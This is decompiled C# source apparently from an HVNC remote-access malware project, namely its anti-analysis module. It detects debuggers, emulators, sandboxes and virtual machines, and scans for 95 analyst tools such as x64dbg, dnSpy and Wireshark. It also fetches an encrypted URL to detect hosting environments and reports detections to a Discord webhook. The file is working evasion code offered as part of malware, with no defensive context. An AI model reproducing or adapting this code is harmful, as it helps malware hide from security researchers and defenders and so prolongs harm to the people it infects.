using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using ShitarusPrivate.Icarus;

namespace ShitarusPrivate.HVNC.Helpers
{
    internal sealed class AntiAnalysis
    {
        [Serializable]
        [CompilerGenerated]
        private sealed class __c
        {
            public static readonly __c __9 = new __c();

            public static Func<string, bool> __9__6_0;

            internal bool _SandBox_b__6_0(string dll)
            {
                return GetModuleHandle(dll + ".dll").ToInt32() != 0;
            }
        }

        [CompilerGenerated]
        private sealed class __c__DisplayClass5_0
        {
            public string[] selectedProcessList;

            internal bool _Processes_b__0(Process process)
            {
                return selectedProcessList.Contains(process.ProcessName.ToLower());
            }
        }

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static bool Debugger()
        {
            bool isDebuggerPresent = false;
            try
            {
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            }
            catch
            {
                return isDebuggerPresent;
            }
        }

        public static bool Emulator()
        {
            try
            {
                long ticks = DateTime.Now.Ticks;
                Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                {
                    return true;
                }
            }
            catch
            {
            }
            return false;
        }

        public static bool Hosting()
        {
            try
            {
                string text = new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[48]
                {
                    145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
                    49, 235, 197, 102, 94, 163, 45, 250, 10, 108,
                    175, 221, 139, 165, 121, 24, 120, 162, 117, 164,
                    206, 33, 157, 1, 101, 253, 223, 87, 30, 229,
                    249, 102, 235, 195, 201, 170, 140, 162
                }));
                return text.Contains("true");
            }
            catch
            {
            }
            return false;
        }

        public static bool Processes()
        {
            __c__DisplayClass5_0 _c__DisplayClass5_ = new __c__DisplayClass5_0();
            Process[] processes = Process.GetProcesses();
            _c__DisplayClass5_.selectedProcessList = new string[95]
            {
                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
                "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
                "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
                "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
                "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
                "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
                "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
                "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
                "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
                "soap monitor", "internet traffic agent", "socketsniff", "networkminer", "network debugger"
            };
            return processes.Any(_c__DisplayClass5_._Processes_b__0);
        }

        public static bool SandBox()
        {
            string[] source = new string[5] { "SbieDll", "SxIn", "Sf2", "snxhk", "cmdvrt32" };
            return source.Any(__c.__9__6_0 ?? (__c.__9__6_0 = __c.__9._SandBox_b__6_0));
        }

        public static bool VirtualBox()
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                try
                {
                    using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
                    foreach (ManagementBaseObject item in managementObjectCollection)
                    {
                        if ((item["Manufacturer"].ToString().ToLower() == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || item["Manufacturer"].ToString().ToLower().Contains("vmware") || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
                catch
                {
                }
            }
            foreach (ManagementBaseObject item2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
            {
                if (item2.GetPropertyValue("Name").ToString().Contains("VMware") && item2.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    return true;
                }
            }
            return false;
        }

        public static bool Run()
        {
            if (Config.AntiAnalysis != "1")
            {
                return false;
            }
            if (Processes())
            {
                FakeErrorMessage("Cracking tools detected");
            }
            return false;
        }

        public static void FakeErrorMessage(string tool)
        {
            DiscordWebHook.SendReport(tool);
            DiscordWebHook.SendReportT(tool);
        }
    }
}
